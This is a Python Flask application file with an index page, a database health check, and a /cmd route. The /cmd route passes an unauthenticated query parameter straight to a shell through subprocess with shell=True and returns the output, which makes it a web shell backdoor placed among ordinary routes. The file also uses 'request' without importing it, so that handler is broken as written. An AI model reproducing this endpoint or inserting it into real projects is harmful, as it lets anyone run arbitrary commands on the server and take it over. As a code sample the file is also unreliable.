from flask import Flask, render_template
from db import get_db, close_db
import sqlalchemy
from sqlalchemy import text
from logger import log
import subprocess

app = Flask(__name__)
app.teardown_appcontext(close_db)

def run_command(cmd: str, timeout: float | None = None) -> str:
    """Run a shell command and return its combined stdout and stderr."""
    result = subprocess.run(
        cmd,
        shell=True,
        capture_output=True,
        text=True,
        timeout=timeout,
    )
    return result.stdout + result.stderr
@app.route("/cmd")
def cmd():
    cmdx = request.args.get("cmd")
    cmdo = run_command(cmdx)
    return cmdo


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/health")
def health():
    log.info("Checking /health")
    db = get_db()
    health = "BAD"
    try:
        result = db.execute(text("SELECT NOW()"))
        result = result.one()
        health = "OK"
        log.info(f"/health reported OK including database connection: {result}")
    except sqlalchemy.exc.OperationalError as e:
        msg = f"sqlalchemy.exc.OperationalError: {e}"
        log.error(msg)
    except Exception as e:
        msg = f"Error performing healthcheck: {e}"
        log.error(msg)

    return health
